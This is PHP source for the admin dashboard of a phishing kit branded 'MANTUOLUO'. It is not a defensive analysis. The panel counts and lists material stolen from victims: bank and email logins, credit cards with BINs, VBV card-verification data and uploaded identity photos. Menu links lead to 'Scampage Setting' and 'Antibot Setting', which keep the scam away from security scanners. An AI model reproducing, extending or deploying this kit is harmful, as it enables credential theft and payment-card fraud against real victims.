<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_click = count_c("../result/total_click.txt");
$total_login = count_c("../result/total_login.txt");
$total_cc = count_c("../result/total_cc.txt");
$total_vbv = count_c("../result/total_vbv.txt");
$total_bank = count_c("../result/total_bank.txt");
$total_bot = count_c("../result/total_bot.txt");
$total_upload = count_c("../result/total_upload.txt");
$total_email = count_c("../result/total_email.txt");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <title>MANTUOLUO - Admin Panel</title>
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <h3>MANTUOLUO</h3>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="active has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <li>
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li>
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Bot Detected</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <h3>MANTUOLUO</h3>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li class="active has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <li>
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li>
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Bot Detected</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                       
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            
                            <div class="header-button">
                                <div class="noti-wrap">
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="overview-wrap">
                                    <h2 class="title-1">Statistic</h2>
                                    <br><br><br>
                                </div>
                            </div>
                            <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--green">
                                <h2 style="color:#fff;" class="number"><?php echo $total_click;?></h2>
                                <span style="color:#fff;" class="desc">clicks</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-email-open"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--blue">
                                <h2 style="color:#fff;" class="number"><?php echo $total_login;?></h2>
                                <span style="color:#fff;" class="desc">LOGIN</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-account-o"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--orange">
                                <h2 style="color:#fff;" class="number"><?php echo $total_email;?></h2>
                                <span style="color:#fff;" class="desc">Email login</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-account-box-mail"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--red">
                                <h2 style="color:#fff;" class="number"><?php echo $total_bank;?></h2>
                                <span style="color:#fff;" class="desc">Bank Login</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-money-box"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--orange">
                                <h2 style="color:#fff;" class="number"><?php echo $total_cc;?></h2>
                                <span style="color:#fff;" class="desc">Credit Card</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-card"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--green">
                                <h2 style="color:#fff;" class="number"><?php echo $total_vbv;?></h2>
                                <span style="color:#fff;" class="desc">VBV</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-shopping-cart"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--red">
                                <h2 style="color:#fff;" class="number"><?php echo $total_upload;?></h2>
                                <span style="color:#fff;" class="desc">Upload Photo</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-face"></i>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="statistic__item statistic__item--blue">
                                <h2 style="color:#fff;" class="number"><?php echo $total_bot;?></h2>
                                <span style="color:#fff;" class="desc">BOT Detected</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-bug"></i>
                                </div>
                            </div>
                        </div>
                            
                        </div>
                        
                        <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">Credit Card (<?php echo $total_cc;?>)</h2>
                                <div class="table--no-card m-b-40" style="max-height: 500px;overflow:scroll;">
                                    <table class="table table-borderless table-striped table-earning">
                                        <thead>
                                            <tr>
                                                <th>Country</th>
                                                <th>BIN</th>
                                                <th>Device</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            if(file_exists("../result/total_bin.txt")){
                                            $bin = file_get_contents("../result/total_bin.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $name = $bins[0];
                                                $code = $bins[1];
                                                $country = $bins[2];
                                                $device = $bins[3];
                                                if($name == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img src='https://www.countryflags.io/".$code."/flat/16.png'> ".$country."</td>
                                                <td>".$name."</td>
                                                <td>".$device."</td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td></tr>";
                                            }
                                            ?>
                                        
                                            
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                        
                        <div class="row">
                            <div class="col-md-12">
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->
